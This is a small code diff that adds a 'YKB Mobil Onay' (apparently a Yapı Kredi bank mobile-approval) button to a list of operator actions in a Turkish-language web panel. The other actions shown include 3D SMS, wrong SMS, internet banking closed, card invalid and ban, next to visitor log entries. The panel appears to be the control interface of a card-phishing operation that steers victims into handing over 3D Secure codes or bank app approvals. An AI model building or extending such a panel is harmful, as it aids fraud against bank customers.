@@ -688,6 +688,7 @@ Geldiği Tarih: ${log.tarih || ''}`;
   const actionButtons = [
     { key: '3D_SMS', label: '3D SMS', icon: '📱', color: '#059669' },
     { key: 'HATALI_SMS', label: 'HATALI SMS', icon: '❌', color: '#dc2626' },
+    { key: 'YKB_MOBIL_ONAY', label: 'YKB Mobil Onay', icon: '📲', color: '#0284c7' },
     { key: 'INT_KAPALI', label: 'İNT KAPALI', icon: '🔒', color: '#4b5563' },
     { key: 'PROVIZYON', label: 'KART HATALI', icon: '💳', color: '#2563eb96' },
     { key: 'BAN', label: 'BAN', icon: '🚫', color: '#ea580cab' },
